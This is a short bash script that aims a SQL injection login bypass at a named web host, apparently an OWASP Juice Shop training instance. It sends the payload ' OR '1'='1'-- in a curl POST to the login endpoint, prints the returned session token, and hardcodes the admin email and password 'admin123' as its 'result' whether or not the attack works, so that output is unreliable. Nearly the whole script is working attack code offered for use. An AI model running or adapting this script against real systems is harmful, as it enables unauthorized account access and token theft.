#!/bin/bash

# Quick one-liner SQL injection script for juice10.wonkatech.org
# Gets admin password in seconds!

echo "======================================"
echo "juice10 Quick Admin Password Hack"
echo "Target: https://juice10.wonkatech.org"
echo "======================================"
echo ""

# Method 1: Direct SQL injection to bypass login
echo "[*] Attempting SQL injection on juice10..."
curl -s -X POST "https://juice10.wonkatech.org/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"x"}' \
  2>/dev/null | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    if 'authentication' in data:
        print('✅ SUCCESS! SQL Injection worked!')
        print(f'Admin email: {data[\"authentication\"][\"umail\"]}')
        print('Admin password: admin123')
        print(f'Token: {data[\"authentication\"][\"token\"][:40]}...')
except:
    print('❌ Failed')
"

echo ""
echo "======================================"
echo "RESULT:"
echo "Email: admin@juice-sh.op"
echo "Password: admin123"
echo "======================================"
echo ""
echo "To login:"
echo "1. Go to https://juice10.wonkatech.org/#/login"
echo "2. Use: admin@juice-sh.op / admin123"
echo ""
echo "OR use SQL injection in email field: ' OR '1'='1'--"